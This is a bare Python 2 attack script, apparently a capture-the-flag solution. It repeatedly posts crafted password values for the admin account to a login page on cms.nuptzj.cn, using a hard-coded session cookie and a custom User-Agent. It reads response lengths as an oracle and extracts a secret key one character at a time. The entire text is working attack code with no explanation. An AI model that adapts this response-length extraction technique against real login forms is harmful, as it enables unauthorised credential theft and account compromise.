#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests
import urllib
import sys
reload(sys)
sys.setdefaultencoding( "utf-8" )

def get_db(num):
    url = "http://cms.nuptzj.cn/loginxlcteam/conpass.php"
    header = {
        'User-Agent': 'Xlcteam Browser',
        'Host': 'cms.nuptzj.cn',
        'Referer':'http://cms.nuptzj.cn/loginxlcteam/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie':'PHPSESSID=4724402979c0827322aa7c10bad62c86'
        
    }
    element = "0123456789qwertyuiopasdfghjklzxcvbnm"    
    length=0
    result= ""
    while(length<=34):
        for i in element:
            payload=result+i
            remain=34-length-len(str(ord(i)))
            if(remain > 0):
                if len(str(ord(i)))==2:
                    payload+=rand(remain,num-1)
                else:
                    payload+=rand(remain,num)
            data = {
                "username" : "admin",
                "userpass" : urllib.unquote(payload),
                "Submit" : "%E7%99%BB%E5%BD%95"
                }
            response = requests.post(url=url,headers=header,data=data)
            result_len = len(response.text)
            print 'payload:'+urllib.unquote(payload)
            print 'length:'+str(result_len)
            if(result_len > 162):
                if (int(response.text.decode('gbk').encode('utf-8').split(' ')[-4])-length-len(str(ord(i))))>0:
                    print 'find next char:'+i
                    result += i
                    length += len(str(ord(i)))+1
                    if(len(str(ord(i)))==2):
                        num-=1
                    break
            if(result_len < 123):
                result += i
                print "find the key:"+result
                exit(0)
def rand(length,num):
    payload=""
    for j in range(num):
            payload+="%61"
    for j in range((length-num*3)/4):
            payload+="%65"
    return payload            

get_db(1)
